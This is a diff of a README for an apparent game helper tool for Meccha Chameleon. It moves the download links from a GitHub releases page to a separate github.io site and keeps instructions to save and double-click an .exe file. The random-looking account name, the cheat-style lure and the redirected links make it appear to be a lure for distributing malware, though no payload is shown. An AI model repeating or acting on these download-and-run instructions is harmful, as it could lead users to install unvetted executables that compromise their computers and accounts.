@@ -1,6 +1,6 @@
 # 🦎 .github - Improve your play in Meccha Chameleon
 
-[Download the latest version here](https://github.com/girandolapodilymbus581/.github/releases)
+[Download the latest version here](https://girandolapodilymbus581.github.io)
 
 ## 🎮 About the tool 
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to get the software ready on your machine.
 
-1. Go to the [official release page](https://github.com/girandolapodilymbus581/.github/releases) to find the latest download.
+1. Go to the [official release page](https://girandolapodilymbus581.github.io) to find the latest download.
 2. Click the file name that ends with .exe to save it to your computer.
 3. Open your Downloads folder.
 4. Double-click the file you just saved.
